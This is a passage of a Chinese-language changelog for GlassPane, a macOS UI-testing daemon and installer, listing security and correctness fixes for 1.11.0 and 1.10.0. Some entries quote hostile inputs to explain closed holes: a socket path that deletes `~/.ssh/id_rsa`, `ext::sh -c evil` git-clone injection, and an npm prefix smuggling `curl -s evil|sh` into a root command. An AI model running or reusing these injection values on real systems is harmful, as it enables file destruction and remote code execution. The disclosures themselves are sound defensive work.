# Changelog

本文件记录 GlassPane 的值得注意的变更。格式遵循 Keep a Changelog，版本号遵循 Semantic Versioning，条目按时间倒序。

## [1.11.0] — 2026-10-11

**版本判断：minor。** 判据还是 1.6.2 写下、1.9.0 沿用的那四条，逐条实测：状态文件字段没动；
daemon 退出码集合仍是 `{0,1,2,3,64,65}`（`grep -oE "exit\([0-9]+\)"` 量出六个，本轮新增的
拒绝全落在已有的 1 与 64 上）；两个 npm 包的 `bin` 没动（`glasspane-mcp`→`dist/index.js` +
`dist/http-gateway-cli.js`，`glasspane-install`→`./cli.js`）。动的是**对外可见的契约内容**：
`--socket-path` / `--probe-socket-path` 新增相对路径拒绝与非 socket 名字硬拒；面板新增一个存活
三态与第三种措辞；`--evidence-stats` 的 `listFailure` 有了读者；MCP 壳把 `attach.bundleId` /
`observe.role` 的上界由 256/128 对齐到 daemon 自己的 512。按"动契约就不塞 patch"这条，minor。

**本版与 `v1.10.0` 的碰撞是量出来的，不是猜的。** 本轮开工实测 tag / npm 两包 / 仓库版本线都是
1.9.0；跑的过程中另一路并行任务把 `v1.10.0` 全链发掉（tag + Release `draft=false` +
target `5f0fb54` + npm 两包 1.10.0 + 归档 `(^|/)harness/` 计数 0，都复核过），其中**四笔与本轮
修的是同一处缺陷**、各写各的：`4e18bc8`（签名在而验不过不再"继续安装"）、`95f0007`（证据包临时名
不再共用）、`2b7fae5`（面板结论必须有读者、重启结论只能由实测点亮）、`3eac88a`（`sun_path` 容量
判定）。合并时这四处**一律取上游那份**并删掉本轮的重复实现与重复闸——已发布的实现是超集（重启那处
上游还给 pid 回读、把 launchctl 层与 pid 层分开、并让 `manualRestartHint` 第一次有了读者）。
`git merge-tree` 实测 9 处内容冲突全部手工解完，合并树上重跑了全套门禁（数字见下），
所以本版发的是**两条线合起来验证过的字节**。

`harness/**` 与 `kernel/**` 的内容与版本照旧一字未动（只有 `set-version` 按版本线写
`kernel/package.json` 与 lockfile 的版本号字段）；面 A 因本轮有意增长 +317 LOC 做了
`--record`，单独一条 `chore(harness)` 提交，与代码同批。



本轮（2026-10-09 定时任务）的代码审查、安全审查、UX/功能缺口分析与修复全部记在这里。**没有给它取
版本号，也没有发版**：开工实测 tag / npm 两包 / 仓库版本线都是 1.9.0；运行期间另一路并行任务把
`v1.10.0` 打出去、两个 npm 包也升到 1.10.0，其中至少四笔与本轮的**同一处缺陷**各自写了一遍——
`4e18bc8`（签名在而验不过不再"继续安装"＝本轮安装器第 2 条，同改 `installer/cli.js`）、
`95f0007`（证据包临时名不再共用＝本轮存储第 2 条，同改 `EvidenceStore.swift`）、
`2b7fae5`（面板结论必须有读者、重启结论只能由实测点亮＝本轮面板第 6/9 条，同改
`ConsoleModel/SettingsModel/SettingsPanelView/ProjectsTabView`）、`3eac88a`（`sun_path` 容量判定＝
本轮 socket 那批的邻处，同改 `SocketServer/ProbeSocketServer/DaemonProbe`）。两侧从未在一起跑过
门禁：把本树并进已发布线上再打 tag，等于发一份**没有被联合验证过**的字节。这一步连同取号一起
留给用户裁决。

取号时的判据（在本分支的树上实测）：状态文件字段未动；daemon 退出码集合仍是 `{0,1,2,3,64,65}`
（`grep -oE "exit\([0-9]+\)"` 实测六个，新增拒绝都落在已有的 1 与 64 上）；两个 npm 包的 `bin`
未动（`glasspane-mcp`→`dist/index.js`+`dist/http-gateway-cli.js`，`glasspane-install`→`./cli.js`）；
**动的是对外可见的契约内容**——`--socket-path` / `--probe-socket-path` 新增相对路径拒绝与非 socket
名字硬拒，面板新增一个存活三态与第三种措辞，`--evidence-stats` 的 `listFailure` 有了读者，MCP 壳把
`attach.bundleId` / `observe.role` 的上界由 256/128 对齐到 daemon 自己的 512。按 1.6.2 写下、1.9.0
沿用的口径（动契约就不塞 patch），**应记 minor**。

面 A 基线本轮**没有** `--record`：实测 `mcp-shell/src` 由金样的 8,658 LOC 涨到 8,847（+189，
全部是本轮有意改动），`node harness/tools/tool-surface.mjs --check` 因此转红。这属于本轮自己的
增长、本该同批补记，但本轮不发版、且上游那笔并行改动同样在动这个面，此时 `--record` 会把两条线
的计数混进同一份金样——留给发版那一步与用户裁决一起处理。

### Fixed — 证据语义：测不到的地方不许替它答

- **退化趋势的斜率一直是舍入噪声，不是测量**（P0）。`DegradationSignal.slope` 用原始 epoch 秒做
  `n*Σxy − Σx*Σy`：自变量在 1.8e9 量级，`Σx²` 到 2e20，分母是两个 2e20 相减留下的约 5e3，
  消去之后只剩浮点舍入的残渣。把这文件自己的算式在 400 组随机真 epoch 上跑一遍：真实 +500 B/s 的
  泄漏，旧式**400 组全部**测不出 ±5% 以内的数（其中 100 组直接判"不足统计"），噪声也能被测成大正数。
  而这根斜率的符号就是 T9 熔断档位的输入——一档判反，证据里就是一次不存在的泄漏或一次被放过的真泄漏。
  现在先减均值再累加，分子分母都回到小量级。闸：`ReviewCoreATests.testSlopeOfAFiveHundredBytePerSecondLeakSurvivesEpochTimestamps`
  （撤掉修复必红，按上面那组数字）+ 抖动对照 + 单点/零跨度仍拒。
  ⚠ 这条修复**自己又引入过一次同族缺陷**，正是被那句"零跨度仍拒"抓出来的：中心化之后拿
  `centredXX > 0` 当跨度判据不够——六个同一个 epoch 相加再除以六，商与那个 epoch 并不严格相等
  （`6*e` 自己要舍入），每个 `x − meanX` 于是是 1e-7 量级的残渣，平方和刚过零判据，一条没有时间
  跨度的窗口被算出一个 `0.0` 的斜率：那还是"除出来的数"冒充"测不出"。现在按 x 的极差判，零跨度
  回到 `nil`。记在这儿是因为失效模式换了外衣：分母从"两个大数相减"变成"均值的舍入"。
- **窗口在两次采集之间被拖走时，那个像素比说的是两块屏幕**（P0）。`windowId` 相同只证明"截的还是
  那个窗口"，不证明"截的是同一块区域"：`WindowCapture.bounds` 每次各自解析，尺寸没动、位置动了
  （SCKCapturer 按当帧的 frame 裁屏）时，before/after 是两块区域的裁剪，逐像素比照样给一个 0...1
  的数，并作为 `signals.pixelDiff` 发布"界面变没变"。现在两帧边界必须逐边对齐到半磅内，否则
  `pixelDiff = nil` 并给出新成因标签 `pixel-capture-window-moved`（`Classifier` 那张成因表也认得它）。
  闸：`ReviewCoreBTests.testWindowMovedBetweenCapturesIsNotPublishedAsAPixelMeasurement`。
- **事件 tap 的活性从前等于"句柄不是 nil"**（P0）。`CGEvent.tapCreate` 成功返回一个**从未启用**的 tap
  是文档化的结果（目标崩了、被别的探针抢占、席位状态不对），而系统在建tap 时禁用它不会补发 disable
  回调——于是 `AttributionGuard` 拿着 `monitored: true, contaminated: false` 给一次没人监听过的
  操作签了"无污染"。现在活性只认 `CGEvent.tapIsEnabled` 的回读，且每次 pump 再读一次，断掉的
  那个 tick 不再被当成"这一轮没有人工输入"。闸：`ReviewCoreATests.testTapLivenessIsAssignedFromTheEnabledReadBackNotFromTheHandle`
  ——**这是形状闸**：装一个真的 session-level tap 会吃掉这台机器的键盘，读取本身无法在门禁里跑。
- **遮挡读不出边界时不许当"没遮挡"**。`SCKCapturer` 的邻居循环从前把解析不出边界的窗口折成
  `CGRect(0,0,0,0)`：空矩形永不相交，于是真实遮挡者从 `occludedBy` 里消失，而被 R6-11 判过谎的
  显示区域裁剪又活了；目标窗口压根不在 CG 列表里时，每一个窗口都被算成遮挡它。现在不可数的邻居
  不进名单、目标在场与否单独记，两种数不出都拒答而不是给一个"空列表"。
- **ping 超时不许把预算写成回答时间**（`pingMs = 2000` 是分类器打印的"这个 app 答了多久"，而它
  压根没答）：改记实测经过时间，并把预算留在成因文本里。闸
  `testPingTimeoutReportsMeasuredElapsedRatherThanTheBudgetConstant`。
- **两处"一个标签下两件事实"**：角色过滤后的 observe 从前在摘要算不出来时借用**未过滤**那棵树的
  摘要（`digest` 与 `nodeCount`/`axTree` 从此描述两棵树）——改为如实抛出；`gp_restore` 的回显把
  选择器里**没给**的 `title`/`identifier` 写成空串（空串读起来像"断言它等于空"）——改为缺席。
- **只比对不回滚的那条路在不可抵赖的链上写的是 `restore executed: compare`**：同段兄弟路径都写
  "planned only"/"failed at step N"，只有它用了 executed 字样。改成
  `restore compared only, no step rolled back: compare`，并有一条断言禁止 executed 再现。
- **熔断原因不再整句消失**：`pixelDiff == nil` 那条从前还要 `treeBefore != nil` 才成立，于是树**也**
  失败时只剩 `ax-tree-capture-failed`，像素通道的名字（席位被拒/超时/取不到图）蒸发；性能升级那句
  从前把带实测 `NNNNms > 10000ms` 的整句换成裸前缀 `performance|`。两处都改成"各自说各自的"。
- 一条审查指控被**规格推翻并已撤回**：说"`axChanged == false` 且无像素测量时判 T3 是替未测量作答，
  应改判 INCONCLUSIVE"。实测 `specs/GlassPane_P0_实施规格_v1.0.md:294` 与
  `..._P1_实施规格_v1.0_SCK迁移.md:80` 写的都是"屏幕录制权限拒绝 → pixelDiff=null：T3 判定仍可用
  （树+操作确认），T6 退化 INCONCLUSIVE"，而 `specs/GlassPane_Audit_2026-09-22_全量审查与UI迭代.md`
  的 A-7 处理过同一处、结论是"改文案、归类保持保守不变"。诚实由措辞保证：`pixelClause` 在无测量时
  说 "pixels not measured"。这条现在由
  `ReviewFixes20261009Tests.testDeadClickStaysDecidableWithoutPixelsButMustSaySo` 钉住，
  免得下一轮把同一条指控再当缺陷报一次。

### Fixed — 存储与协议：读不出不是"没有"

- **一份读不开的审批台账会被下一次追加整个抹掉，而校验还说 valid**（P0）。`ApprovalGate.init`
  在文件存在但解不开时置 `loadFailed` 并以空链起步；`append` 从不看这个旗，于是新记录的 `prevHash`
  从 genesis 重新锚定（`""`），`persist()` 再把整份文件换成这一条记录——盘上所有历史批准被删除，
  而 `--approval-verify` 读到的正是一条自洽的链，报 `valid: true`。这是审计链的数据丢失加假清白，
  而 `ProjectRegistry.requireWritable()` 对同一种状况是拒写的。现在 `loadFailed` 时拒追加、
  一个字节都不碰那个文件、把原因与出路（点名台账文件、`--approval-audit` 读的就是同一个名字）留在
  `persistFailed` 里；文件缺失（`loadFailed == false`）仍照常建档——那条路本来就是新机器。
  闸：`testCorruptLedgerRefusesAppendAndLeavesTheFileUntouched`（逐字节回读比对）+
  `testHealthyLedgerStillAppends` 作对照。
- **归档列目录失败被写成"档案是空的"**（P1）。`LocalArchive` 的扫描在目录存在但列不出时回
  `summaries: []、directoryExists: true`，正是 `EvidenceStore.archiveListing` 存在的理由。
  现在扫描带 `listFailure: String?`，daemon 的 `--prune-evidence` / `--evidence-stats` 把它交出去，
  面板据此进 `.failed` 而不是 `.empty`。
- **规范化 JSON 在两种语言里给出两种字节**（P1）。`CanonicalJSON` 对 NaN/±Infinity 走
  `String(describing:)` 打出 `nan`/`inf`（非法 JSON），而 TS 侧 `JSON.stringify` 给 `null`；
  ≥2^53 的整数值 Swift 打成 `9e+15` 形态、JS 打成固定记法——`treeDigest` 两侧都算它，同一棵树
  于是有两个摘要。现在非有限值回 `null`、整数值按 `JSON.stringify` 的边界用固定记法。
- **注册表的两条腿不再各说各话**：磁盘上那个名字不是 0600 时从前"写成功但如实降级"，而写侧的硬闸
  只看内存字段——现在 load 记实测模式、publish 前重新 lstat，盘上松了照样拒（模式只作拒写理由，
  绝不进 `projects.json`）；三份写路径的临时名改为 `pid + uuid` 唯一（固定的 `<file>.tmp` 允许一个
  同用户进程预置内容、被 daemon 收成 0600 再 rename 进审计链）。
- probe 帧里的 `pid` 从前 `intValue > 0` 后取 `.int32Value`：4294967297 截成 1——现在按 int32 区间
  拒；配方文件（克隆仓库即可控）里的值不再无限原样回显进错误；Crockford/`op_`+26 那套字面量从
  四处抄写收归 `OperationID` 派生；`DaemonProbe` 的默认 socket 路径不再自算第二份家目录口径。

### Fixed — socket 名字与命令行：拒绝删除不是 socket 的 inode

- **`glasspaned --socket-path ~/.ssh/id_rsa` 会删掉那个文件**（P0）。`--socket-path` /
  `--probe-socket-path` 接受任意字符串，`SocketServer` 在把名字判成"没有监听者"时无条件 unlink，
  而"没有监听者"这个分类里包含 **ECONNREFUSED / ENOTSOCK——普通文件正是这么回答 connect 的**。
  于是残留清理那条路把用户的私钥删了并在原地建 socket；`installer/cli.js` 会把调用方给的
  `--socket-path` 写进 launchd plist，这条在产线上可达。现在每次接管名字的 unlink 之前先 `lstat`
  并要求 `S_ISSOCK`：普通文件、目录、符号链接一律硬拒、点名它是什么、且**绝不删除**。
  `--force-socket` 是"顶掉一个监听者"的意图，不是"删掉这个位置上的任何东西"的意图，这条也单独钉了。
  闸：`ReviewLifecycleTests` 的 engine/probe 六条（含撤掉守卫即红的字节断言）+ 两条对照
  （**确认是 socket 的残留照旧清掉并接管**，否则这条闸只是把 bind 关掉）。
  与被撤回的旧断言同批：`PermissionSubjectTests.testProbeStartClearsDemonstrablyUnownedName`
  原来钉的正是"普通文件占名→清掉再 bind"，改名并反转为
  `testProbeStartRefusesToDeleteARegularFileAtItsName`。
- **相对 `--socket-path` 会把用户文档目录收成 0700**（P1）：`cd ~/Documents && glasspaned
  --socket-path ./s.sock` 先 chmod 那个目录、随后 bind 失败退 1，模式改动留下了。现在两个 socket
  开关与 `--state-dir` 共用同一套绝对路径规则（一处判定，三种拼写不可能各说各话）。
- **探针监听者从前只 mkdir(0700) 就完事**（P1，安全）：既不改已存在目录、不核所有权、不读回模式，
  也不拒绑——攻击者持有或 0755 的目录能长期供着 `probe.sock`，随时 unlink 再自绑，被测试 app 的探针
  流经攻击者，而 daemon 一直报"没有探针连接"，归因与检查点回滚静默失效。现在与 engine 侧共用同一条
  目录收紧闸（实测 0700 不粘就拒绝登记那个名字）。
- **开关三处清单里 `-v` 是隐形的**（P2）：解析表有 `-v`、usage 与文件头都没有，而那条具名报错的
  奇偶闸只扫 `--` 前缀，短开关按构造永不参与对照。现在表/usage/头三处各 33 条、零差集，闸自己
  带自证（单侧缺项必须点名）。

### Fixed — 设置面板：只呈现实测

- **"运行中"从前由文件是否存在决定**（P0）。`reachable` 取的是 `DaemonProbe.reachable`，那函数是
  `fileExists`；崩掉而留下 socket 文件的 daemon 于是点亮绿点+"运行中"，同时四张权限卡说服务没在跑。
  现在存活只由 `liveness` 的三态决定，`.answered` 才算运行中，"有人应门但不开口"有自己那句
  （既不谎报在跑，也不谎报没跑），一次 hello 失败不再被"保留上次的 true"。
- **五处 nil 折成假值**：自动更新开关在读不出处境时 `?? false` 画成"关"（而同刻开关还可点）；
  `snapshot == nil` 说成"没有待装版本"（读不到与没有是两件事）；验证失败后徽标仍留着上一次的
  "可用（实测）"；`daemonBinaryPath` 只在 nil 时赋值，重装/重启后面板继续 exec 退役的那份二进制
  （清理/删除/校验/统计四条路径都是）；档案卡只在 `.onAppear` 取数，首帧没 hello 就永远卡在
  "后台服务不可达"，刷新按钮也不再取。另修：读不出的档案把视图卡死在"正在读取"（现走
  loading/failed/loaded 三态），"重启后台服务"不看 `kickstart` 退出码、`manualRestartHint` 全仓
  零消费者（现接进失败支且失败时清掉 hello 派生字段），以及禁用理由里那句指向不存在的
  `updater status` 可执行文件的话。
- **面板不再写进它管不着的状态根**（P1）：`ConsoleModel` 每条 CLI 调用都按家目录默认根跑，用户用
  `--state-dir` 挪过根的话，清理按钮会**删另一个根里的真档案**，而文案还说"档案目录：<这个根>"
  （那里可能压根没有档案目录）。现在每条调用显式点名 `--state-dir`，并写明按的是哪一条规则。
- `Measured`（"未测量" ≠ "没有"）这个指示器从前零消费者，而本轮一半的面板缺陷就是它的缺失；现在
  nil 快照、不可达的统计、未测的像素通道三处都在用它。

### Fixed — MCP 壳：一次坏帧不许炸掉别人

- **一条超长回音让所有在飞请求一起死，还被判成 daemon 失联**（P0）。oversize 走 error 通道，
  `onError` 对任何错误都 forget + `io.close()`；close 触发 `teardown`，把**别的**每个在飞请求都判成
  `GP_E_ENGINE_UNREACHABLE` 加一条重启命令（那会 SIGTERM 一个正在 `act` 的 daemon），而这条调用自己
  的文本还写着"连接完好、其他请求不受影响"。现在超长帧只结算它自己那一路，套接字与他人不受牵连
  （`LineReader` 丢弃到换行后重同步，与 Swift 侧 `FrameCodec.discardUntilNewline` 同规则）。
  闸 `an oversize daemon reply fails only its own call...` 走的是真 `Duplex` + 生产 `StreamLineIo`，
  旧代码必红。
- **无 id 的错误帧从前删掉最早那个在飞条目**（P1）：被误判的调用方可能是一条帧本来解析成功的 `act`，
  真回音随后到就被判成"客户端没发过的帧"，operationId 永远进不了轨迹。现在与已结算那支同处理：
  标记 + 保留给迟到回音。
- **迟到回音不再把 AX 树原样写进 stderr**（P2，安全）：那里面是窗口标题与控件值；现在只记方法、
  id 与字节数，并保留"这是未脱敏的引擎内容"这句实话。
- **remedy 不许要求重发有副作用的动作**：轨迹里每个 id 都回 `GP_E_NO_EVIDENCE` 时，壳从前既断言一个
  它不可能知道的成因（"引擎可能重启过"），又命令"重跑 gp_act"——同函数另一处明令不许这么做。
  三条"看日志然后重试"也各自改判：按方法是否可安全重放分支，不可重放的只指读侧工具。
  闸是一张**表**：`table: no shell-fault remedy for a replay-unsafe method orders a re-send`。
- **契约上界对着 daemon 取齐**（P1）：壳把 `attach.bundleId` 卡在 256、`observe.role` 卡在 128，
  而 `Dispatcher.swift` 用的是 512——更紧的壳界不是安全余量，它拦下的是 daemon 本来会接受并回答的
  帧，代理因此拿不到 daemon 自己的判词。现在两处用 `SELECTOR_MAX_LENGTH`/512，并由
  `consumer-consistency.test.mjs` 直接从 Swift 源码读这两个数字来闸（变异验过：改回 256 即红）。
  `projectId` 是壳**故意**更严的一处，闸里明写这条不对称而不是抹平它。
- **经管道时帮助与报错文本被截**（P1）：stdout/stderr 在被 pipe 时是异步的，`process.exit` 紧跟在
  `write` 之后，读者只剩一个裸退出码；现在同步 fd 写并处理 `EAGAIN`。另修 stdin `"error"` 那条路径
  绕过写队列直接关停（在途回音被丢）。
- 工具会话参数不再自带默认（漏传就记进一条私有轨迹，`gp_recent_reports` 答"没记录过任何操作"）；
  `capture_view` 不再替缺 `mimeType` 的帧编一个 `image/png`；相对 `node updater/cli.js` 这类按未知
  cwd/PATH 解析的 remedy 改为绝对路径或 `/usr/bin/plutil`、`/bin/cat`。
- **本仓的探针缺席时面 B 的归属**：`kernel/schemas/**` 里没有任何工具面 schema（只有
  `decision-log-entry`/`evidence-pack`/`recipe-config`），所谓"三处镜像"在工具面上实测只有两处——
  记在这里，免得下一轮又按三处去找第三处。

### Fixed — 安装器与更新器：验证过的是哪一份字节

- **"安装完成（退出码 0）"从前不证明本轮产物在跑**（P0）。收尾判据是 `arrived && hello?.version`：
  一个旧构建的 daemon 只要还在 socket 上应答，版本号就非空、新构建的那个压根没起，安装器照样报成
  功。现在把**本轮那个二进制**的 `--version`（与 hello 同源的同一条字面量）与 hello 的版本核一次，
  不一致就是"旧构建还在服务"——红字点名两个版本号、给 `--replace-daemon`、非零退出；读不出该二进制
  的版本时说的是"这项检查没做成"，不是"检查通过"。桩与真解析器同形（非 `--version` 一律
  `unknown argument` + 64），有求必应的桩正是这个缺陷此前一路绿的原因。
- **`GLASSPANE_REPO_URL` 是文档化的覆盖项，直接插进 `git clone`**（P0，安全）：
  `ext::sh -c evil`（或 `--upload-pack=` 打头的 `GLASSPANE_REF`）在克隆那一刻就执行命令。
  现在只放 `https://`/`ssh://`/`file://`，以 `-` 打头的值拒，URL 前有 `--`，`install.sh` 与
  `installer/cli.js` 同一套（`file://` 只为让门禁能真跑一次克隆来证明守卫在起作用；README 里
  这条口径同步改了，scp 式 `git@host:path` 现被拒）。
- **BAD 签名不再"继续安装"**（P1）。`status === 'invalid'` 是篡改的正证据，从前黄字一句继续跑
  `npm install`/`swift build`/`make-app.sh`，而 SECURITY.md §2.8 写的是"发布了却验不过＝硬拒，
  任何同意都不许越过"。（同一段也如实记下：`git verify-tag` 验的是克隆里那个 ref-tip，
  不是被钉住的那个 tag 对象——这条限制现在写在拒绝文案里。）
- **HOME 未设或相对、以及以 root 跑**，从前会让整份安装落进 CWD 或 `/var/root`；现在两条守卫都在
  任何一次写入之前。收拢旧实例那一步不再把所有 pid 一律报成"已结束"：EPERM 与僵尸各归"我动不了它"，
  幸存者单独点名并给人能跑的那条命令（从前 `kill -0` 对僵尸回成功，于是把人支去 `sudo kill -9` 一个
  已经死的 pid）。预检不再把 `/usr/bin/swift`、`/usr/bin/git` 那两个 CLT shim 当"装了"（文件在、
  一跑就死）；launchd plist 以 0600 落盘并把模式读回来。
- **`--no-prompt` 从前是个不存在的能力**：`confirm()` 全仓零调用，README 却说它"跳过每步确认"。
  现在它真有作用——覆盖已有 bundle、bootout 已加载作业、`--replace-daemon` 收拢在跑实例这三处破坏性
  动作各问一次；非交互又没给旗是**跳过**（绝不默认同意），`install.sh` 在非 TTY 时补上该旗，因此
  `curl | sh` 与 `npm run install:engine:silent` 的行为不变。
- **更新器的签名信任锚由它所认证的发布送过来**（P0）。锚是 `installer/cli.js` 里的
  `GLASSPANE_SIGNING_PUBLIC_KEY`，而 `installer/` 是**从发布归档**复制进运行时的：一次没带可用签名、
  被人以 `--consent unsigned-release` 放行的发布，就装下了攻击者的钥匙，此后每个攻击者发布都读成
  `verified`——常驻警告、`--consent` 的拒绝、整道闸 8 一起静默消失。现在 `updater/lib/` 里钉住主钥
  指纹，导入的钥匙与 `VALIDSIG` 那一项必须都等于它，否则判 `invalid`（不可被同意越过）。
  这个数不是抄来的：本机用真 gpg 实测——导入 `installer/cli.js` 的钥匙得
  `0929EA31DF4F7429F63FC53189D88B1D043A1298`，已发布的 `SHA256SUMS-1.9.0.txt.asc` 对它验签回
  `VALIDSIG` 同一指纹；测试用 gpg 从那块 armored 钥匙**重推**这个常量，两者哪天分家就是一条红。
  换钥匙＝改这一行并说明理由。
- **暂存证明不再对着另一份字节发**（P1）：`verifyStagedBytes` 先哈希归档、再读**同一个路径**解出来，
  随后 build/pack 用的还是先前那棵树——同用户代码可以在哈希时给签名归档、在第二次读之前换掉它。
  现在一次读入、对同一段字节哈希并解压、交出去的是刚证明过的那棵树；测试注入接缝真的换第二次读，
  不再只改树（旧套件的正例对这种交换全盲）。
- **换装不再是 `rmSync` 再 `cpSync`**（P1）：备份与最后盖章之间被杀，`~/Applications/GlassPane.app`
  就残缺或消失，而 `update-state.json` 还说旧版本装着。现在复制先进 `<name>.new-<pid>` 再同卷
  `rename`，中途失败原地那份字节完好（用会抛的接缝测）。
- **`sudo chown -R "$(whoami)" <dir>` 这种 remedy 消失了**（P1，安全）：`<dir>` 直接来自
  `npm config get prefix`，同用户进程把 `prefix=/tmp/x"; curl -s evil|sh; #` 写进 `~/.npmrc`
  就拿到一条给人或代理执行的 root 命令。更新器此前所有 remedy 都是**节点自己 spawn argv、从不进
  shell**，这条是唯一漏出去的一句特权 shell 拼接。现在路径一律引号包好、命令一律不代拼，
  并把 `lib/` 整片纳入 remedy 扫描。另修：`readDaemonVersion` 从前不看退出码、stdout 里任何
  `\d+\.\d+\.\d+` 都算"本机版本"（一句 usage banner 里的数字就成了升降级的基线）；
  `enable --hour 25` 会写出永不触发的 plist 而状态还说"自动更新已开"；登记"验过"从前只要参数里
  **含有** cli 路径，与另一处严格比对的两个读者对同一个事实能给出相反答案；gzip 解到有界上限、
  归档成员模式掩掉组/其他可写位、重定向后读不出终点 URL 时改为 fail-closed。

### Fixed — LLDB 桥、CI、文档

- **被调试的进程可以伪造桥的载荷**（P1）：目标 stdout 经 lldb 的 stdout 流回，`extract_sentinel`
  取**第一个**可解析的哨兵对，所以目标先打印一句 `GPBRIDGE<<{...}>>GPBRIDGE` 就能替换线程/状态与
  成功判词，或在两对之间打印坏 JSON 让真载荷读成"没有载荷"。现在取最后一个可解析对，并且每次运行
  带一个不可猜的 nonce。同批：`text=True` 严格解码在非 UTF-8 字节上让桥以 traceback 死掉（违反它自己的
  "失败也以 JSON 交出"）；`shlex.quote` 是 shell 层引号、那段文本却由 Python 求值，带撇号的 exe 路径
  每次都SyntaxError；`gp-watch add … x` 这种模式既不读也不写、永不触发却占掉四个硬件槽之一，
  账上还写着已武装。
- **CI 两处**：`harness-contract.yml` 的计划通道从前 `|| true` 抹掉退出码、只靠 `grep -q "drift"`
  判红——probe 崩了没有"drift"于是**绿着放行**一个没人验证过的升级，而干净路径自己打印"no drift"
  又能假红。现在以退出码为权威（0 完好 / 1 漂移 / 2 测不了），判决按行首行尾锚定，"0 而无判决行"
  这类形状一律不算通过。`ci.yml` 此前没有顶层 `permissions:`（另两条 workflow 都有），逐 job 核过
  只需要 `contents: read` 之后补上。
- **文档与代码对齐**：SECURITY.md 双语 §2.2 曾让读者把 `--replace-daemon` 交给 `glasspaned`——那是
  安装器的旗，daemon 会回 `unknown argument` + 64，照着这一页办事的代理拿到的是一次拒绝而不是一次
  接管（P0：文档指示了一条跑不通的命令）；§4 受影响版本表还写着"1.1.x 是当前线"；§2.3 指向 §2.4 说
  "今天仍存在一个世界可读的文件"，而 §2.4 自己与代码都已收口。README 双语：`install.sh` 钉的 tag
  写成 v1.1.1（实测当时是 v1.9.0，现随本版更新）；"归因默认 weak"与代码的 `.soft` 相反（weak 是被
  污染时的判词）；"「安装更新」不授予这一项"与面板实际提供的 `--consent unsigned-release` 那条路相反；
  "Does anything leave my machine? No." 对照计划更新器的出网 HTTPS 不成立；"macOS 14+"与
  `Package.swift` 的 `.macOS(.v13)`；CONTRIBUTING 双语说 CI 七条 job，实测九条（缺
  `harness-rulers` 与 `workflow-lint`）。

### 本版未修（如实记录）

- `release.yml` 的两个发布 job 不跑任何测试：打在一条测试全红的 commit 上，照样 GPG 签名发
  GitHub Release，dispatch 也照样永久发两个 npm 包（P1）。这是不可逆通道，改动本身也要真机核，
  本轮**没有**动它——列进待裁决。
- `engine/scripts/make-app.sh` 只签外层 bundle，`Contents/MacOS/<exe>` 保留 SwiftPM 的 ad-hoc
  标识；结论需 `codesign -dvvv` 对着运行中的进程看，属**待真机复跑**。
- bind 与 `shutdownSockets.register` 之间那一步被 SIGTERM 会留下 socket 文件（要改就得在信号路径
  周围重排 setup 步骤，与本仓已被真机证伪过的那族方案冲突）；本轮按设计**不改**。
- `--prune-evidence` 在"读不出"与"本来没有"两种情形给出的答案仍同形（同一族的另一处，本轮只修了
  列目录与写侧）。
- Actions 仍引用可变 major 标签（`actions/checkout@v4` 等），包括签名与发布那条路径。
- 面板的清理预览仍读它自己的文件，而不是 daemon 的 `--project-prune` 试算——"按下的删除与确认时
  看到的不是同一张表"这一族只在文案里交代，没改成试算（架构决策，待裁决）。
- 公证（Developer ID + notarytool）仍是 owner 未启用的决策，本轮未做也未声称。
- `iterate.config.yaml` 里记录的 `package.json` 指纹（`958fa100…`）与今天实测值漂移；那是 iterate
  侧账本，本轮只报不改。
- SCK 像素通道、四张 TCC 席位、无障碍/事件监听的真实读数：CI 与本机器都造不出登录 GUI 会话，
  一律**待真机复跑**，不得标"已验证"。

## [1.10.0] — 2026-10-10

**版本判断：minor。** 判据沿用本仓自己在 1.6.2 条目里写下那一条：patch 要求"状态文件的字段
没动、退出码集合没动、CLI 参数没动、npm 包的 `bin` 声明没动"。这四条本版都没动；动的是
**新增用户可见控制件**——控制台多了一条动作结论横幅（`gp-action-message`，带「关闭」入口），
权限页与项目页各多一行重启实测结论。按那一条交代，这升 minor 而非 patch。
**本版合并了 `v1.9.0` 打 tag 之后落在 main 的全部未发布改动**（下面第一段起就是那些记录，
原样归入，未作删改；其中 `glasspaned --version` 那条自己写明"下一版按 minor 记"，与本版判据一致）。
`harness/` 与 `kernel/` 不在本版发布面：harness 的目录、尺子与金样一律未动，kernel 的源码与
`kernel/schemas/**` 也未动——只有 `scripts/set-version.mjs` 这一个入口按版本线把
`kernel/package.json` 与 `kernel/package-lock.json` 的**版本号字段**从 1.9.0 写成 1.10.0
（它是本仓版本线的位点之一，`check-version` 要求十处一致）；`@iterate/kernel` 未发布、
其 npm 通道与 pin 未动。归档照旧减去 `harness/`。

- **`glasspaned --version`（下一版按 minor 记，因为 CLI 参数动了）。** 更新器把"本机装的是什么版本"
  交代成两条读数必须一致：bundle 的 `CFBundleShortVersionString` 与 `glasspaned --version`
  （`updater/lib/version.js` 的表头就这么写的）。1.9.0 及以前**后一条腿在真机上从来是空的**——
  `grep '"--version"' engine/Sources` 零命中，真二进制回的是 `unknown argument` + usage + 退出码 64；
  而套件一直绿，因为 `updater/test/helpers.mjs` 的那个桩**对任何参数都 echo 版本号**，替一个不存在的
  开关作了背书（桩里跑过的守卫等于没验）。本版起：daemon 的 `--version` 打印 `hello` 里同一个字面量
  并退 0，且不碰状态根；那份字面量收成单一无出处的 `EngineCore.buildVersion`（`hello`、`--version`
  与位点表都读它，两处抄写从此没法各说各话）；测试桩改成与真解析器一致（只认 `--version`，其余按
  `unknown argument` + 64 拒绝）；`updater/lib/selfcheck.js` 两种形状都认得，并有一条用例专门钉住
  "那一行搬家了"不许成为拒掉一份正常暂存树的理由——那是这个工具自己掐自己的升级路径。
  新增闸：`DaemonVersionFlagTests`（真起一次 debug 二进制核那两句话、并核解析表与 usage 互逆）、
  `selfcheck.test.mjs` 的形状对照（旧形状、新形状、两种都没有必须把两处都点名）。
- **文档补记（在 `v1.9.0` 打 tag 之后落到 main，因此 1.9.0 的发布归档里还是旧文）。**
  SECURITY 双语 §2.4 之前只列了 `installer-daemon.log` 这一份 launchd 写的日志，本版把
  `~/.glasspane/update.log` 也纳进了"什么在盘上"的清单与收紧交代，并写明 `0644` 那个数字是从它
  那位兄弟的实测搬过来的、这一轮没有对真机 launchd 作业重测。代码侧的措施（`AGENT_LOG_NAME` →
  `StateRoot.updateLogFile` → 注册前 0600）确实随 1.9.0 发出，缺的只是这份文档的同步。

- ⚠ 同批两处由复审（对已合并 diff 的 fresh-eyes 一遍）抓出来的：
  - `selfcheck.js` 先认两种字面量形状时用的是一个"两种都匹配"的正则，于是**读哪个由行序决定**：
    一份两份都在的树会读到实例那一份。改成先找权威出处 `public static let buildVersion`，
